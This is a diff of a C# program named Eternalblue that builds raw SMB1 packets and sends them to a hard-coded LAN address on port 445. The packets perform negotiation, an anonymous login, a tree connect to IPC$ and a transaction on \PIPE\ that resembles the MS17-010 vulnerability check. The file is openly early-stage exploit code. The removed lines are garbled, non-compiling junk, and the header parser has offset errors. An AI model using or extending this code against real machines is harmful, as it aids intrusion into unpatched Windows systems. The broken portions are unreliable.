@@ -1,74 +1,151 @@
 ﻿using System;
-using System.Collections;
 using System.Collections.Generic;
 using System.Linq;
 using System.Net.Sockets;
 using System.Text;
-using System.Threading.Tasks;
 
 namespace Eternalblue
 {
     class Program
     {
+        public static byte[] smb_header;
 
-        private static byte[] negotiate_proto_request()
+        public struct SMBHeader
         {
-
-            byte[] pkt = {0x00};             // Message_Type
-            pkt += 0x00,0x00,0x54;       // Length
-            kh
-                asdasd;
-
-
-            $pkt += 0xFF,0x53,0x4D,0x42 // server_component: .SMB
-            $pkt += 0x72             // smb_command: Negotiate Protocol
-            $pkt += 0x00,0x00,0x00,0x00 // nt_status
-            $pkt += 0x18             // flags
-            $pkt +=  0x01,0x28         // flags2
-            $pkt += 0x00,0x00         // process_id_high
-            $pkt += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 // signature
-            $pkt += 0x00,0x00         // reserved
-            $pkt += 0x00,0x00         // tree_id
-            $pkt += 0x2F,0x4B         // process_id
-            $pkt += 0x00,0x00         // user_id
-            $pkt += 0xC5,0x5E           // multiplex_id
-
-            $pkt += 0x00             // word_count
-            $pkt += 0x31,0x00         // byte_count
-
-            //Requested Dialects
-            $pkt += 0x02             // dialet_buffer_format
-            $pkt += 0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x31,0x2E,0x30,0x00  // dialet_name: LANMAN1.0
-
-            $pkt += 0x02             // dialet_buffer_format
-            $pkt += 0x4C,0x4D,0x31,0x2E,0x32,0x58,0x30,0x30,0x32,0x00  // dialet_name: LM1.2X002
-
-            $pkt += 0x02             # dialet_buffer_format
-            $pkt += 0x4E,0x54,0x20,0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x20,0x31,0x2E,0x30,0x00 # dialet_name3: NT LANMAN 1.0
-
-            $pkt += 0x02             # dialet_buffer_format
-            $pkt += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00   # dialet_name4: NT LM 0.12
-
-            return $pkt
-}
-
-        static string Client_Negotiate(Socket sock)
-        {
-            
-            return "";
+            public byte[] server_component;
+            public byte smb_command;
+            public byte error_class;
+            public byte reserved1;
+            public byte[] error_code;
+            public byte flags;
+            public byte[] flags2;
+            public byte[] process_id_high;
+            public byte[] signature;
+            public byte[] reserved2;
+            public byte[] tree_id;
+            public byte[] process_id;
+            public byte[] user_id;
+            public byte[] multiplex_id;
         }
+
+        public static SMBHeader Parsed_SMBHeader(byte[] unparsed)
+        {
+            SMBHeader header = new SMBHeader();
+            header.server_component = unparsed.Take(3).ToArray();
+            header.smb_command = unparsed[4];
+            header.error_class = unparsed[5];
+            header.reserved1 = unparsed[6];
+            header.error_code = new byte[] { unparsed[6], unparsed[7] };
+            header.flags = unparsed[8];
+            header.flags2 = new byte[] { unparsed[9], unparsed[10] };
+            header.process_id_high = new byte[] { unparsed[11],unparsed[12]};
+            header.signature = new byte[] { unparsed[13], unparsed[14], unparsed[15], unparsed[16], unparsed[17], unparsed[18], unparsed[19], unparsed[20], unparsed[21] };
+            header.reserved2 = new byte[] { unparsed[22],unparsed[23]};
+            header.tree_id = new byte[] { unparsed[24], unparsed[25] };
+            header.process_id = new byte[] { unparsed[26], unparsed[27] };
+            header.user_id = new byte[] { unparsed[28], unparsed[29] };
+            header.multiplex_id = new byte[] { unparsed[30], unparsed[31] };
+            return header;
+        }
+
+
+        static public byte[] smb1_get_response(Socket sock)
+        {
+            byte[] tcp_response = new byte[1024];
+            try
+            {
+                sock.Receive(tcp_response);
+            } catch (Exception e)
+            {
+                Console.WriteLine("Socket Error, exploit may fail: " + e);
+            }
+            Console.WriteLine(tcp_response);
+            smb_header = tcp_response.Skip(4).ToArray();
+            return tcp_response;
+        }
+
+        static public byte[] client_negotiate(Socket sock)
+        {
+            byte[] pkt = new byte[] { 0x00, 0x00, 0x00, 0x54, 0xff, 0x53, 0x4d, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2F, 0x4B, 0x00, 0x00, 0xC5, 0x5E, 0x00, 0x31, 0x00, 0x02, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30, 0x32, 0x00, 0x02, 0x4E, 0x54, 0x20, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x20, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4E, 0x54, 0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00 };
+            sock.Send(pkt); 
+            return smb1_get_response(sock);
+        }
+
+        static public byte[] smb1_anonymous_login(Socket sock)
+        {
+            byte[] pkt = make_smb1_anonymous_login_packet();
+            sock.Send(pkt);
+            return smb1_get_response(sock);
+        }
+
+        static public byte[] make_smb1_anonymous_login_packet()
+        {
+
+            byte[] pkt = { 0x00, 0x00, 0x00, 0x88, 0xff, 0x53, 0x4D, 0x42, 0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xfe, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0d, 0xff, 0x00, 0x88, 0x00, 0x04, 0x11, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x00, 0x4b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x32, 0x00, 0x31, 0x00, 0x39, 0x00, 0x35, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00, 0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x35, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x00, 0x00 };
+            return pkt;   
+        }
+
+
+        static public byte[] check_please(Socket sock)
+        {
+            byte[] pkt = {0x00,0x00,0x00,0x00,0xff,0x53,0x4d,0x42,0x25,0x00,0x00,0x00,0x00,0x18,0x01,0x28,0x00,0x00,0x00,0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ,0x00,0x0,0x08,0x04,0x56,0x00,0x08,0x24,0x86,0x10,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0x00, 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00,0x4a,0x00,0x00,0x00,0x4a,0x00,0x02,0x00,0x23,0x00,0x00,0x00,0x07,0x00,0x5c,0x50,0x49,0x50,0x45,0x5c,0x00};
+            int len = pkt.Length - 4;
+            byte[] hexlen = BitConverter.GetBytes(len);
+            pkt[1] = hexlen[2];
+            pkt[2] = hexlen[1];
+            pkt[3] = hexlen[0];
+
+            sock.Send(pkt);
+            return smb1_get_response(sock);
+        }
+        
+        static public byte[] tree_connect_andx(string ip, Socket sock, byte[] user_id)
+        {
+            byte[] pkt = tree_connect_andx_request(ip, user_id);
+            sock.Send(pkt);
+
+            return smb1_get_response(sock);
+        }
+
+        static public byte[] tree_connect_andx_request(string ip, byte[] user_id)
+        {
+            string ipc = @"\\" + ip + @"\IPC$";
+            System.Diagnostics.Debug.WriteLine(ipc);
+
+            byte[] pkt = new byte[] { 0x00,0x00,0x00,0x47,0xff,0x53,0x4d,0x42,0x75, 0x00, 0x00, 0x00, 0x00 ,0x18, 0x01, 0x20 ,0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 , 0x00, 0x00 , 0x00, 0x00 ,0x2f,0x4b,user_id[0],user_id[1],0xc5,0x5e,0x04,0xff,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x1a,0x00,0x00};
+            byte[] ipc_byte = Encoding.ASCII.GetBytes(ipc);
+            byte[] rest = new byte[] { 0x00, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 0x00 };
+
+            //merge
+            pkt = pkt.Concat(ipc_byte).ToArray();
+            pkt = pkt.Concat(rest).ToArray();
+
+            int len = pkt.Length - 4;
+            byte[] hexlen = BitConverter.GetBytes(len);
+            pkt[1] = hexlen[2];
+            pkt[2] = hexlen[1];
+            pkt[3] = hexlen[0];
+
+            return pkt;
+        }
+
 
 
         static void Main(string[] args)
         {
-            string ip = "192.168.141.210";
+            string ip = "192.168.112.112";
             int port = 445;
 
             TcpClient client = new TcpClient(ip, port);
             Socket sock = client.Client;
 
+            client_negotiate(sock);
+            smb1_anonymous_login(sock);
 
+            SMBHeader smbh = Parsed_SMBHeader(smb_header);
+            tree_connect_andx(ip, sock, smbh.user_id);
 
+            check_please(sock);
 
         }
     }
